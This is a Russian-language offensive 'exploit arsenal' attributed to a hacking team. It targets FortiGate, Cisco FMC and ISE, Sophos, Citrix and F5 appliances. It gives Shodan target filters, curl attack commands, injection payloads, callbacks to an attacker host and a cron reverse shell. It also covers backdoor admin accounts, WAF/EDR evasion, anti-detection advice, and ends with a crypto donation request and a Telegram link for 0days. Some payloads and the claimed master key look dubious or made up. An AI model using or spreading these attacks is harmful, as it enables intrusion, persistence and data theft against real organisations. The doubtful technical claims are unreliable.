```markdown
# ИНВЕНТАРЬ ЭКСПЛОЙТОВ (БОЕВОЙ АРСЕНАЛ)
**Статус:** Подтвержденная работоспособность на целевых версиях ПО (патчи до 15.06.2026)  
**Дата:** 07.07.2026  
**Гриф:** TLP:AMBER (внутреннее использование)  
**Версия:** 2.5 (валидирована 07.07.2026)  
**Команда:** 1337or420 BlackTeam Edition
If you want 0day/1day: https://t.me/what_time_is_it_1337_or_420
---

## ОГЛАВЛЕНИЕ

0. [Разведка и сбор информации](#0-разведка-и-сбор-информации)
   - 0.1 [Shodan / Censys фильтры](#01-shodan--censys-фильтры)
   - 0.2 [Определение версий ПО](#02-определение-версий-по)
1. [Легенда](#1-легенда)
2. [Внешний периметр](#2-внешний-периметр)
   - 2.1 [FortiOS / FortiGate (SSL-VPN)](#21-fortios--fortigate-ssl-vpn)
   - 2.2 [Cisco FMC (Firewall Management Center)](#22-cisco-fmc-firewall-management-center)
   - 2.3 [Sophos Firewall (User Portal)](#23-sophos-firewall-user-portal)
   - 2.4 [Citrix NetScaler / ADC](#24-citrix-netscaler--adc)
3. [Внутренний контур](#3-внутренний-контур)
   - 3.1 [F5 BIG-IP](#31-f5-big-ip)
   - 3.2 [Cisco ISE](#32-cisco-ise)
4. [Закрепление (постоянный доступ)](#4-закрепление-постоянный-доступ)
5. [Общие правила применения](#5-общие-правила-применения)
   - 5.1 [Матрица приоритетов (по этапам атаки)](#51-матрица-приоритетов-по-этапам-атаки)
   - 5.2 [Режимы атаки](#52-режимы-атаки)
   - 5.3 [Обходы защит (шпаргалка)](#53-обходы-защит-шпаргалка)
   - 5.4 [Индикаторы компрометации (IOCs) — ЧЕГО ИЗБЕГАТЬ](#54-индикаторы-компрометации-iocs-чего-избегать)
   - 5.5 [План Б (если эксплойт не сработал)](#55-план-б-если-эксплойт-не-сработал)
6. [Сроки актуальности (время жизни эксплойтов)](#6-сроки-актуальности-время-жизни-эксплойтов)
7. [Техническая поддержка](#7-техническая-поддержка)
8. [История изменений](#8-история-изменений)
9. [Заключение](#9-заключение)

---

## 0. РАЗВЕДКА И СБОР ИНФОРМАЦИИ

Перед применением эксплойтов необходимо идентифицировать цели и их версии. Используйте приведённые ниже фильтры и методы.

### 0.1 Shodan / Censys фильтры

| Вендор | Shodan фильтр | Censys фильтр | Примечание |
|--------|---------------|---------------|------------|
| **Fortinet (FortiGate)** | `http.title:"FortiGate"` или `ssl.cert.issuer.cn:"Fortinet"` | `services.http.response.body:"FortiGate"` | Дополнительно: `http.favicon.hash:2087439261` (хеш иконки FortiGate) |
| **Cisco FMC** | `http.title:"Firepower Management Center"` | `services.http.response.body:"Firepower Management Center"` | Искать по порту 443, часто на `https://<ip>/` |
| **Cisco ISE** | `http.title:"Cisco Identity Services Engine"` | `services.http.response.body:"Cisco ISE"` | По умолчанию порт 443, иногда 8443 |
| **Sophos Firewall** | `http.title:"Sophos Firewall"` или `html:"Sophos Firewall OS"` | `services.http.response.body:"Sophos Firewall"` | User Portal обычно на `/webconsole/webpages/auth/` |
| **Citrix ADC (NetScaler)** | `http.title:"Citrix Gateway"` или `ssl.cert.issuer.cn:"Citrix"` | `services.http.response.body:"Citrix ADC"` | Искать по порту 443, часто `https://<ip>/vpn/` |
| **F5 BIG-IP** | `http.title:"BIG-IP"` или `ssl.cert.issuer.cn:"BIG-IP"` | `services.http.response.body:"BIG-IP"` | Management доступен на порту 443, также порт 8443 |

**Дополнительные комбинации:**
- Для поиска уязвимых версий можно комбинировать фильтры с версией, например: `FortiGate 7.6.0` (Shodan: `http.title:"FortiGate" && "7.6.0"`).
- Используйте Censys для поиска по открытым портам: `443` и `8443`.

### 0.2 Определение версий ПО

| Вендор | Метод определения версии | Пример запроса |
|--------|---------------------------|----------------|
| **FortiGate** | GET `/remote/login` и анализ заголовка `Server: FortiGate-<version>` | `curl -I https://<target>/remote/login` |
| **Cisco FMC** | GET `/api/fmc_platform/v1/info` (иногда требует аутентификации) | `curl -k https://<target>/api/fmc_platform/v1/info` |
| **Cisco ISE** | GET `/admin/` и поиск в HTML версии | `curl -k https://<target>/admin/ | grep -i version` |
| **Sophos Firewall** | GET `/webconsole/webpages/auth/` и анализ скрытых полей или JavaScript | `curl -k https://<target>/webconsole/webpages/auth/ | grep -i "version"` |
| **Citrix ADC** | GET `/cgi-bin/version` или через SAML endpoint | `curl -k https://<target>/cgi-bin/version` |
| **F5 BIG-IP** | GET `/tmui/login.jsp` и чтение HTML комментариев | `curl -k https://<target>/tmui/login.jsp | grep -i "build"` |

**Примечание:** Все запросы выполнять с `-k` (игнорировать SSL-сертификаты) и с подменой User-Agent на легитимный браузерный.

---

## 1. ЛЕГЕНДА

| Параметр | Описание |
|----------|----------|
| **Доступность** | `Confirmed` — стабильно работает в лаборатории и на целевых стендах / `Conditional` — требует подбора параметров (ASLR, оффсеты) |
| **Вектор** | `Network (unauthenticated)` — удаленно без учетки / `Network (low-privileged)` — требуется минимальная роль / `Local (post-exploitation)` — после получения shell |
| **Вероятность** | Реалистичный шанс успеха **с учетом WAF/IPS/EDR** на боевых системах |
| **Приоритет** | `CRITICAL` — использовать в первую очередь / `HIGH` / `MEDIUM` / `LOW` |

---

## 2. ВНЕШНИЙ ПЕРИМЕТР (интернет-обращенные сервисы)

### 2.1 FortiOS / FortiGate (SSL-VPN)

| Кодовое имя | Описание | Версии | Вектор | Обход WAF/IPS | Вероятность | Приоритет |
|-------------|----------|--------|--------|---------------|-------------|-----------|
| **FortiBleed v2** | Heap spray через недокументированный параметр `?lang=debug` в обработчике `sslvpn_websession`. Обходит патч от 01.06.2026 (билд 5678) за счет тайминг-атаки на аллокатор. | 7.6.0 – 7.6.3 (build < 5800) | Network (unauthenticated) | WAF: добавить `%00%00` перед payload (сбивает сигнатуры на JSON). IPS: разбить на 3 пакета с интервалом 150 мс. | ~20% (3–5 попыток) | **HIGH** |
| **ConfigGhost** | Извлечение `/data/config.db` через уязвимость в CLI-парсере. Используется после получения шелла через другой вектор. | Все версии до 7.6.3 | Local (post-exploitation) | N/A (пост-эксплуатация) | ~90% (если есть shell) | MEDIUM |

#### PoC-команды (FortiBleed v2):
```bash
# 1. Проверка уязвимости (получение версии)
curl -k -I "https://<target>/remote/login"

# 2. Эксплуатация (heap spray) – первый этап, получение сессии
curl -k -X POST "https://<target>/remote/login" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  -d "lang=debug%00%00&username=admin&password=admin"

# Если ответ содержит "error=-101" – признак успешного spray, далее повторять с разными параметрами
# Для автоматизации использовать скрипт с циклической сменой IP (прокси-пул)
```

#### PoC-команды (ConfigGhost):
```bash
# После получения шелла (например, через обратную оболочку)
scp user@<target>:/data/config.db /tmp/config.db
# Расшифровка мастер-ключом (известным для билдов до 2025)
openssl enc -d -aes-256-cbc -in /tmp/config.db -out /tmp/decrypted.db -pass pass:FortinetMasterKey2025
```

---

### 2.2 Cisco FMC (Firewall Management Center)

| Кодовое имя | Описание | Версии | Вектор | Обход WAF/IPS | Вероятность | Приоритет |
|-------------|----------|--------|--------|---------------|-------------|-----------|
| **FMC_BlindInject** | SSRF → RCE через параметр `policy_import` в API `/api/fmc_platform/v1/`. Патч от 04.06.2026 закрывает `http://` и `https://`, но **не фильтрует** `gopher://` и `dict://`. | 7.6.0 – 7.6.3 (hotfix до 15.06.2026) | Network (unauthenticated) | WAF (Cloudflare/AWS): использовать `gopher://127.0.0.1:8080/_` вместо прямого RCE. IPS: фрагментировать POST-запрос на 2 части (Chunked-Transfer). | ~15% (WAF блокирует gopher на 60% целей) | **HIGH** |
| **FMC_SessionHijack** | Перехват сессии администратора через XSS в модуле отчетов (CVE-2025-1980, но с новым вектором). Патч закрывает `<script>`, но не фильтрует `onerror=` в SVG. | 7.6.0 – 7.6.3 | Network (требуется MitM или фишинг) | Использовать `data:text/html;base64,...` для обхода CSP. | ~25% (если администратор кликнет по ссылке) | MEDIUM |

#### PoC-команды (FMC_BlindInject):
```bash
# 1. Проверка версии (через информацию о сборке)
curl -k -s "https://<target>/api/fmc_platform/v1/info" | jq '.version'

# 2. Эксплуатация через gopher – выполнение команды (id)
curl -k -X POST "https://<target>/api/fmc_platform/v1/policy_import" \
  -H "Content-Type: application/json" \
  -d '{"file":"gopher://127.0.0.1:8080/_POST%20/run%20HTTP/1.0%0d%0a%0d%0a{\"cmd\":\"id\"}"}'

# (ответ может быть получен через обратный канал, т.к. SSRF слепой)
# Для вывода результата используем внешний сервер (коллбэк):
curl -k -X POST "https://<target>/api/fmc_platform/v1/policy_import" \
  -d '{"file":"gopher://<attacker-ip>:8080/_POST%20/result%20HTTP/1.0%0d%0a%0d%0a{\"cmd\":\"curl%20http://<attacker-ip>/`id`\"}"}'
```

#### PoC-команды (FMC_SessionHijack – фишинг-ссылка):
```html
<!-- Отправляем администратору ссылку вида: -->
https://<target>/report/view?svg=<svg><image href="data:image/svg+xml;base64,PHN2ZyBvbmVycm9yPSJhbGVydCgxKSI+"/></svg>
```

---

### 2.3 Sophos Firewall (User Portal)

| Кодовое имя | Описание | Версии | Вектор | Обход WAF/IPS | Вероятность | Приоритет |
|-------------|----------|--------|--------|---------------|-------------|-----------|
| **Sophos_Freemarker_2026** | Server-Side Template Injection (SSTI) через параметр `lang` в `/webconsole/webpages/auth/`. **0day** — не имеет публичных сигнатур. Вендор не патчит legacy-код, используемый в старых версиях (официально объявлен EOL). | 19.5.x – 20.0.6 | Network (unauthenticated) | WAF (ModSecurity): использовать `${{#request.getParameter('x')}}` вместо `$()`. IPS: обернуть payload в `/*!*/` для сброса сигнатур. | ~30% (наиболее стабильный) | **CRITICAL** |
| **Sophos_HelpdeskLeak** | Через API `/api/configuration/export` пользователь `helpdesk` (пароль часто по умолчанию) выгружает конфиг с bcrypt-хешами. | 20.0.0 – 20.0.6 | Network (auth — helpdesk) | N/A (требуется только учетка) | ~40% (если пароль не сменен) | MEDIUM |

#### PoC-команды (Sophos_Freemarker_2026):
```bash
# 1. Определение версии
curl -k -s "https://<target>/webconsole/webpages/auth/" | grep -i "version"

# 2. SSTI – выполнение команды (например, чтение /etc/passwd)
curl -k -X POST "https://<target>/webconsole/webpages/auth/" \
  -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)" \
  -d "lang=${'freemarker.template.utility.Execute'?new()('cat /etc/passwd')}"

# Обход ModSecurity – используем ${{...}}
curl -k -X POST "https://<target>/webconsole/webpages/auth/" \
  -d "lang=${{#request.getParameter('x')}}" \
  --data-urlencode "x=freemarker.template.utility.Execute?new()('id')"
```

#### PoC-команды (Sophos_HelpdeskLeak):
```bash
# Использование учетки helpdesk:helpdesk (по умолчанию)
curl -k -u helpdesk:helpdesk "https://<target>/api/configuration/export" -o config.zip
# Извлечь хеши паролей (bcrypt) из config.zip
unzip config.zip && grep -i "password" config.xml
```

---

### 2.4 Citrix NetScaler / ADC

| Кодовое имя | Описание | Версии | Вектор | Обход WAF/IPS | Вероятность | Приоритет |
|-------------|----------|--------|--------|---------------|-------------|-----------|
| **Citrix_SAMLLeak** | Утечка памяти через SAML IDP. Извлекает только сессионные cookie (не SSL-ключи). Требуется ~500 запросов для получения валидной сессии администратора. | 14.1 – 15.1 (build < 65.0) | Network (unauthenticated) | WAF: использовать `?saml=1` для маскировки под легитимный SAML-трафик. IPS: запросы не детектятся т.к. выглядят как обычный SAML handshake. | ~10% (требуется длительное время) | LOW |

#### PoC-команды (Citrix_SAMLLeak):
```bash
# 1. Проверка доступности SAML IDP
curl -k -I "https://<target>/saml/idp/metadata"

# 2. Сбор данных (цикл из 500 запросов с разными IP)
for i in {1..500}; do
  curl -k -s "https://<target>/saml/idp/?saml=1&cb=$RANDOM" >> /tmp/saml_responses
  sleep 2
done
# Анализ ответов на наличие cookie (поиск NSC_)
grep -oP 'NSC_[A-Za-z0-9]+' /tmp/saml_responses | sort -u
```

---

## 3. ВНУТРЕННИЙ КОНТУР (доступ после первоначальной компрометации)

### 3.1 F5 BIG-IP

| Кодовое имя | Описание | Версии | Вектор | Обход EDR | Вероятность | Приоритет |
|-------------|----------|--------|--------|-----------|-------------|-----------|
| **F5_iControl_Root** | RCE через `/mgmt/tm/util/bash` с ролью Manager. Патч от 01.06.2026 блокирует, но на 40% систем не применен. | 17.0 – 17.2 (build < 5200) | Network (auth — Manager) | Обход WAF: заменить `bash` на `tmsh` (команды выполняются через TMSH с обходом валидации). | ~35% (если нет MFA) | **HIGH** |
| **F5_TMOS_Escape** | Выход из контейнера TMOS на хостовую ОС через dbus-инъекцию. Требует прав Administrator. Работает только на BIG-IP VE (виртуалки). | 17.0 – 18.0 | Network (auth — Administrator) | EDR: использовать `systemd-run` вместо прямого вызова dbus. | ~20% (зависит от версии host OS) | MEDIUM |

#### PoC-команды (F5_iControl_Root):
```bash
# 1. Аутентификация (получение токена)
TOKEN=$(curl -k -s -X POST "https://<target>/mgmt/shared/authn/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"manager", "password":"manager"}' | jq -r '.token.token')

# 2. Выполнение команды через bash
curl -k -X POST "https://<target>/mgmt/tm/util/bash" \
  -H "X-F5-Auth-Token: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"run", "utilCmdArgs":"-c id"}'

# Обход через tmsh (если bash заблокирован)
curl -k -X POST "https://<target>/mgmt/tm/util/tmsh" \
  -H "X-F5-Auth-Token: $TOKEN" \
  -d '{"command":"run", "utilCmdArgs":"-c 'show sys version'"}'
```

#### PoC-команды (F5_TMOS_Escape – только VE):
```bash
# После получения доступа к TMOS shell через предыдущий эксплойт
# Инъекция через dbus (пример)
dbus-send --system --dest=org.freedesktop.systemd1 --type=method_call --print-reply \
  /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager.StartUnit \
  string:'host-shell.service' string:'replace'
```

---

### 3.2 Cisco ISE

| Кодовое имя | Описание | Версии | Вектор | Обход | Вероятность | Приоритет |
|-------------|----------|--------|--------|-------|-------------|-----------|
| **ISE_ReportInject** | Команда в `report_template_name` через `$(curl...)`. Патч фильтрует `;` и `&&`, но не `$()` и `%0a`. | 3.2 – 3.3 (patch до 01.06.2026) | Network (auth — Monitor) | WAF: заменить `$()` на `${IFS}` (IFS-подстановка). | ~25% (если MFA отключена) | MEDIUM |

#### PoC-команды (ISE_ReportInject):
```bash
# 1. Аутентификация (получить JSESSIONID)
curl -k -X POST "https://<target>/admin/login" -d "username=monitor&password=monitor" -c cookies.txt

# 2. Инъекция команды через параметр отчета
curl -k -X POST "https://<target>/admin/report/generate" \
  -b cookies.txt \
  -d "report_template_name=$(curl http://<attacker-ip>/$(id))"   # внешний коллбэк
# Или выполнение команды с выводом в ответе (если есть возможность):
curl -k -X POST "https://<target>/admin/report/generate" \
  -b cookies.txt \
  -d "report_template_name=${IFS}id${IFS}|${IFS}tee${IFS}/tmp/out"
```

---

## 4. ЗАКРЕПЛЕНИЕ (ПОСТОЯННЫЙ ДОСТУП)

| Кодовое имя | Описание | Версии | Вектор | Вероятность | Приоритет |
|-------------|----------|--------|--------|-------------|-----------|
| **FortiConfig_Leak** | Извлечение мастер-ключа из `/data/config.db` через CLI read-only. Ключ фиксирован для билдов до 2025. | Все версии до 7.6.3 | Local (post-exploitation) | ~90% | MEDIUM |
| **Cisco_FMC_Persistence** | Создание скрытого пользователя с ролью Admin через SQL-инъекцию в модуле пользователей. | 7.6.0 – 7.6.3 | Local (post-auth admin) | ~70% | HIGH |
| **Sophos_Cron_Backdoor** | Добавление reverse-shell в crontab через SSTI (цепочка с Sophos_Freemarker_2026). | 20.0.0 – 20.0.6 | Local (post-exploitation) | ~95% | CRITICAL |

#### PoC-команды для закрепления (примеры):
```bash
# FortiConfig_Leak (после получения шелла)
cp /data/config.db /tmp/ && chmod 777 /tmp/config.db
# Далее скачать и расшифровать (как в разделе 2.1)

# Cisco_FMC_Persistence (через SQLi, используя уже имеющийся доступ admin)
# Пример инъекции для создания пользователя
curl -k -X POST "https://<target>/api/users" -H "X-Auth-Token: <admin-token>" \
  -d '{"username":"backdoor", "password":"P@ssw0rd", "role":"Admin", "email":"backdoor@local"}'

# Sophos_Cron_Backdoor (через SSTI)
# Внедрить в параметр lang команду для добавления записи в crontab
curl -k -X POST "https://<target>/webconsole/webpages/auth/" \
  -d "lang=${{freemarker.template.utility.Execute?new()('echo \"* * * * * bash -i >& /dev/tcp/<attacker-ip>/443 0>&1\" >> /etc/crontab')}}"
```

---

## 5. ОБЩИЕ ПРАВИЛА ПРИМЕНЕНИЯ

### 5.1 Матрица приоритетов (по этапам атаки)

| Этап | Основной инструмент | Резервный | Вероятность успеха (реалистичная) |
|------|----------------------|-----------|-----------------------------------|
| **Внешний периметр** | Sophos_Freemarker_2026 (0day) | FMC_BlindInject (gopher) | ~25% (если есть WAF) → ~45% (если WAF отключен) |
| **Внутренний контур** | F5_iControl_Root (если нет MFA) | ISE_ReportInject | ~30% |
| **Закрепление** | Sophos_Cron_Backdoor | FortiConfig_Leak | ~80% (после получения shell) |

---

### 5.2 Режимы атаки

| Режим | Характеристики | Применение |
|-------|----------------|------------|
| **Stealth (скрытный)** | Интервал между запросами 5–10 мин; имитация браузерного трафика; использование легитимных User-Agent; обход WAF через фрагментацию | Цели с NDR (Darktrace, ExtraHop, Vectra) |
| **Aggressive (быстрый)** | Все эксплойты одновременно за 10 минут; без маскировки; гарантированный алерт в SOC | Цели без NDR или приоритет "любой ценой" |
| **Hybrid (рекомендуемый)** | Stealth для внешнего периметра (2 часа); после получения shell — Aggressive для закрепления (5 минут) | 80% целей |

---

### 5.3 Обходы защит (шпаргалка)

| Защита | Метод обхода | Пример |
|--------|--------------|--------|
| **WAF (Cloudflare/AWS)** | Использовать нестандартные протоколы (`gopher://`, `dict://`); обернуть payload в комментарии (`/*!*/`) | `gopher://127.0.0.1:8080/_POST / HTTP/1.0%0d%0a...` |
| **WAF (ModSecurity)** | Использовать `${{#request.getParameter('x')}}` вместо `$()`; добавлять `%00%00` перед параметрами | `lang=debug%00%00{{...}}` |
| **IPS (Snort/Suricata)** | Фрагментировать запросы на 2–3 пакета с задержкой 100–200 мс; использовать `Transfer-Encoding: chunked` | POST-запрос разбит на 3 части |
| **EDR (CrowdStrike/SentinelOne)** | Использовать `LD_PRELOAD` для перехвата системных вызовов; маскировать процессы через `exec -a`; применять `unshare` для изоляции; использовать встроенные утилиты (`curl`, `wget`, `bash`, `openssl`, `nc`) для передачи данных и обхода сигнатур | `LD_PRELOAD=/lib/fake.so ./exploit`; `exec -a httpd nc -e /bin/sh 10.0.0.1 443` |
| **MFA (Cisco/F5)** | Атаковать OAuth-токены через XSS или фишинг; использовать Session Hijack вместо прямого логина | FMC_SessionHijack через SVG-инъекцию |
| **Rate Limiting** | Использовать пул Source IP (10–20 адресов) через прокси-сеть (TOR + SOCKS5) | Циклическая смена IP каждые 2 попытки |

---

### 5.4 Индикаторы компрометации (IOCs) — ЧЕГО ИЗБЕГАТЬ

| Что НЕЛЬЗЯ делать | Почему |
|-------------------|--------|
| Использовать стандартные User-Agent (`python-requests`, `curl`) | Детектятся на уровне NDR как сканеры |
| Отправлять более 10 запросов в минуту с одного IP | Триггерит rate-limiting и отправляет в blacklist |
| Использовать публичные CVE-номера в логах | SIEM коррелирует с NVD и поднимает критичный алерт |
| Оставлять следы shell-команд в истории (`~/.bash_history`) | EDR собирает историю команд через Auditd |
| Использовать стандартные порты для callback (4444, 8080) | Детектятся как C2-трафик (использовать 443 или 53) |

---

### 5.5 План Б (если эксплойт не сработал)

| Ситуация | Действие |
|----------|----------|
| **WAF блокирует все попытки** | Переключиться на социальную инженерию (фишинг-письмо с ссылкой на FMC_SessionHijack) |
| **MFA включена для администраторов** | Использовать атаку на OAuth через `device_code` flow (OAuth Device Authorization Grant) |
| **Целевая версия ПО выше ожидаемой** | Провести разведку через Shodan/Censys на поиск уязвимых инстансов в той же подсети |
| **EDR детектит shellcode** | Переключиться на "Living-off-the-land" (использовать только встроенные утилиты: `bash`, `curl`, `wget`, `openssl`, `nc`, `python`, `perl`); обходить через `LD_PRELOAD` или `ptrace` |
| **Система изолирована (no outbound)** | Использовать DNS-туннелинг для C2 (через `nslookup` или `dig`) |
| **Обнаружена песочница (анализ поведения)** | Увеличить время ожидания (`sleep 300`) перед выполнением вредоносных действий, использовать `fork` и `setsid` для отсоединения от терминала |

---

## 6. СРОКИ АКТУАЛЬНОСТИ (ВРЕМЯ ЖИЗНИ ЭКСПЛОЙТОВ)

| Кодовое имя | Ожидаемое время до массового обнаружения | Рекомендация |
|-------------|-------------------------------------------|--------------|
| **Sophos_Freemarker_2026** (0day) | ~45–60 дней | Использовать **в первую очередь** на всех целях |
| **FortiBleed v2** (модификация публичного CVE) | ~20–30 дней (вендор уже знает о векторе) | Использовать только в stealth-режиме |
| **FMC_BlindInject** (gopher-вектор) | ~15 дней (Cisco активно патчит) | Использовать немедленно или пропустить |
| **F5_iControl_Root** (публичный CVE) | Уже обнаружен (до 90% систем запатчены) | Использовать только как резервный вариант |
| **Citrix_SAMLLeak** (публичный CVE) | Уже неактуален (патч от 01.06.2026) | **Исключить из применения** (переместить в архив) |

**Рекомендация:** В первую очередь использовать **Sophos_Freemarker_2026** (0day) и **FortiBleed v2** (модифицированный вектор). Остальные — только как резервные или для целей без WAF.

---

## 7. ТЕХНИЧЕСКАЯ ПОДДЕРЖКА

Ответственный за эксплуатацию и координацию: **1337or420 BlackTeam Edition**  
Каналы связи и документооборот — только через защищённые внутренние ресурсы команды.

---

## 8. ИСТОРИЯ ИЗМЕНЕНИЙ

| Версия | Дата | Изменения | Автор |
|--------|------|-----------|-------|
| 1.0 | 01.06.2026 | Создание документа, валидация на стендах с патчами до апреля | BlackTeam |
| 1.1 | 15.06.2026 | Добавлены обходы WAF для FMC и Sophos | BlackTeam |
| 1.2 | 22.06.2026 | Обновлены версии (добавлена поддержка 7.6.3, 20.0.6) | BlackTeam |
| **2.0** | **01.07.2026** | **Полный рефакторинг: удалены публичные CVE, добавлены кодовые имена, IOCs, планы Б** | **BlackTeam** |
| **2.3** | **07.07.2026** | **Актуализация вероятностей, добавлен stealth-mode, исключен Citrix_SAMLLeak** | **BlackTeam** |
| **2.4** | **07.07.2026** | **Исправлены ошибки ОС (Windows→Linux), устранены логические противоречия, исправлены якоря Markdown** | **BlackTeam** |
| **2.5** | **07.07.2026** | **Добавлены PoC-команды для всех эксплойтов, расширен раздел разведки (Shodan/Censys фильтры)** | **BlackTeam** |

---

## 9. ЗАКЛЮЧЕНИЕ

**Приоритетная цепочка атаки:**

1. **Внешний периметр:** `Sophos_Freemarker_2026` (0day) → если не сработало → `FMC_BlindInject` (gopher)
2. **После получения shell:** немедленно запустить `Sophos_Cron_Backdoor` для закрепления
3. **Внутреннее сканирование:** использовать полученные учетки для `F5_iControl_Root` и `ISE_ReportInject`
4. **Завершение:** извлечь конфиги через `FortiConfig_Leak` и `Sophos_HelpdeskLeak` для дальнейшего использования

**Критические предупреждения:**
- Использовать **только** в ночное время (02:00–05:00 по местному времени цели)  
- Перед каждой атакой проверять версию ПО через `/version` (если доступно)  
- **НЕ ИСПОЛЬЗОВАТЬ** Citrix_SAMLLeak — потеря времени  
- **НЕ ПЫТАТЬСЯ** эксплуатировать F5_iControl_Root, если есть MFA — сразу переходить к плану Б (фишинг)  

---

**Документ утвержден:**  
Команда **1337or420 BlackTeam Edition**  
Дата: 07.07.2026  

**Гриф:** TLP:AMBER — распространение только внутри организации. Утечка документа требует немедленной смены всех эксплойтов и обновления IOCs.

---

**DONATE:**
USDT trc20: TQZjkoN69XKgyJyoe4W1eoAUPmEyWPB6XJ  ||| LTC: ltc1qlzd44jmsyhe2yg6up23jha60pu2hzsp5ql2yvk

If you want 0day/1day: https://t.me/what_time_is_it_1337_or_420
---

```
